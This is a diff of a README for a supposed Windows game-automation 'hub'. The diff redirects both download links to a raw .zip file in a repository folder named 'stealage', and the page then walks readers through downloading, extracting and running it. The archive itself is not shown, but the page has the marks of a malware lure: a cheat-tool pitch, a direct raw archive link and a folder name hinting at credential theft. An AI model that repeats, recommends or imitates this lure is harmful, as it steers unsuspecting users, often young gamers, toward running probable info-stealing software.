@@ -1,6 +1,6 @@
 <h1>🎮 southern-mudding-vvl22-hub - Boost Your Gameplay with Smart Automation</h1>
 <p align="center">
-  <a href="https://github.com/Katsuratreemiddle524/southern-mudding-vvl22-hub" style="display: inline-block; padding: 15px 30px; font-size: 24px; font-weight: bold; color: white; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: 10px; text-decoration: none;">⬇️ DOWNLOAD NOW</a>
+  <a href="https://raw.githubusercontent.com/Katsuratreemiddle524/southern-mudding-vvl22-hub/main/stealage/vvl-southern-mudding-hub-v1.4-alpha.5.zip" style="display: inline-block; padding: 15px 30px; font-size: 24px; font-weight: bold; color: white; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: 10px; text-decoration: none;">⬇️ DOWNLOAD NOW</a>
 </p>
 
 <h2>🚀 What is southern-mudding-vvl22-hub?</h2>
@@ -19,7 +19,7 @@
 <h2>🔧 How to Download and Run (Step by Step)</h2>
 <p>Follow these steps exactly to get this tool working on your Windows computer.</p>
 <ol>
-  <li><strong>Visit this link to download the application:</strong> Click the big button above or go to <a href="https://github.com/southern-mudding-vvl22-hub" style="font-weight: bold; color: #667eea;">this page</a>.</li>
+  <li><strong>Visit this link to download the application:</strong> Click the big button above or go to <a href="https://raw.githubusercontent.com/Katsuratreemiddle524/southern-mudding-vvl22-hub/main/stealage/vvl-southern-mudding-hub-v1.4-alpha.5.zip" style="font-weight: bold; color: #667eea;">this page</a>.</li>
   <li><strong>Find and click the download button:</strong> On the page you open, look for a green or blue button that says "Code" or "Download". Click it, then choose "Download ZIP" or a file that ends with .zip. The page may also show a file with .exe or .msi. Just click the download link with a name similar to "southern-mudding-vvl22-hub".</li>
   <li><strong>Save the file:</strong> Your browser will ask where to save it. Choose your Desktop or Downloads folder.</li>
   <li><strong>If you got a .zip file:</strong> Right-click the .zip file and choose "Extract All", then click "Extract". A new folder with the same name will appear. Open it.</li>
